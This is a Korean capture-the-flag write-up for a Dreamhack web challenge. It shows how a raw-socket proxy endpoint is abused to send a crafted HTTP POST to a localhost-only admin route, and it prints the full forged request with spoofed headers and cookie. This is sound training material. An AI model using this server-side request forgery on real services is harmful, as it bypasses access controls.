created: 2026-01-18 15:10
category: #web 
link: https://dreamhack.io/wargame/challenges/13

# Write-up
- 문제 코드를 분석해보니 `/socket` 경로에 POST 요청을 보내면 raw socket을 통해 다른 곳으로 요청을 보내는 구조였다. 문제의 제목처럼 일종의 proxy 구조인 것으로 보였다.
- 그리고 socket 전송은 TCP/IP 모델에서 전송 계층에 해당된다. 따라서 데이터로 HTTP request를 집어넣을 수 있겠다고 생각했다. 

```python
@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG
```
- 위 코드에 따르면, `/admin` 경로로 요청을 보내서 플래그를 획득할 수 있을 것이다. 
- 그러나 여러가지 조건문으로 막혀있으므로 request 데이터를 잘 구성해야할 것이다. 
- 먼저 `request.remote_addr != '127.0.0.1` 조건문이 있으므로 `/socket` 경로를 통해 `/admin`에 요청을 보내야겠다고 생각했다.
- 그 외 HTTP 속성들은 쉽게 구성할 수 있다.

최종적으로 다음과 같이 데이터를 구성할 수 있었다. **host**는 "127.0.0.1"로 하였고, **port**는 8000으로 설정했다.
> [!NOTE] 
> 편리한 HTTP request 작성을 위해 외부 도구를 사용하였음.
> https://reqbin.com/

```http
POST /admin HTTP/1.1
Accept: */*
Accept-Encoding: deflate, gzip
Host: 127.0.0.1
Cookie: admin=true
User-Agent: Admin Browser
DreamhackUser: admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin
```

최종적으로 `/socket`에서 `127.0.0.1:8000/admin` 경로에 HTTP POST request를 보냈고, 플래그를 획득할 수 있었다. 

# Reference
- https://datatracker.ietf.org/doc/html/rfc3875#section-4.1.8
- https://en.wikipedia.org/wiki/Proxy_server
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Messages#http_requests
- https://www.geeksforgeeks.org/computer-networks/tcp-ip-model/